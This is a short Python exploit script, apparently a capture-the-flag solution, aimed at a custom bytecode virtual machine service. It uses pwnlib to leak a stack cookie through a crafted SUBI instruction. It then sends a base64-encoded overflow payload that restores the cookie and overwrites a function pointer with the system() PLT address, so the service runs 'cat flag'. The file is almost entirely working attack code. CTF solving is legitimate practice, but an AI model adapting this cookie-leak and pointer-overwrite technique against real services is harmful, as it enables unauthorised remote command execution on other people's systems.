import struct
import re
import pwnlib
import sys

OP_TERM = 9
OP_OR   = 8 # or r[%d], r[%d], r[%d]
OP_AND  = 7 # and r[%d], r[%d], r[%d]
OP_XOR  = 6 # xor r[%d], r[%d], r[%d]
OP_DIV  = 5 # div r[%d], r[%d], r[%d]
OP_MUL  = 4 # mul r[%d], r[%d], r[%d]
OP_SUBI = 3 # subi %d 0x%02x%02x
OP_SUB  = 2 # sub r[%d], r[%d], r[%d]
OP_ADDI = 1 # addi r[%d], 0x%02x%02x
OP_ADD  = 0 # add r[%d], r[%d], r[%d]

system_plt = 0x4010D0

def main(host, port):
    conn = pwnlib.tubes.remote.remote(host, port)
    conn.clean()

    bytecode = struct.pack('BBH', OP_SUBI, 88, 0x00)
    bytecode = pwnlib.util.fiddling.base64.b64encode(bytecode)


    conn.sendline(bytecode)
    data = conn.recvline_contains(('Returning'))
    cookie = int(re.search('0x([a-f0-9]+)',data).group(1), 16)

    conn.clean()

    bytecode = '\x00'
    bytecode += 'cat flag'

    bytecode += '\x00' * (0x80-len(bytecode))
    bytecode += struct.pack('>I', cookie)
    bytecode += '\xBB' * 12 # alignment padding
    bytecode += struct.pack('Q', system_plt) # replace the pointer to add with system
    bytecode = pwnlib.util.fiddling.base64.b64encode(bytecode)

    conn.sendline(bytecode)
    conn.clean_and_log()

if __name__ == '__main__':
    try:
        main(sys.argv[1], int(sys.argv[2],0))
    except IndexError:
        print('Usage: ex_fruits.py HOST PORT')
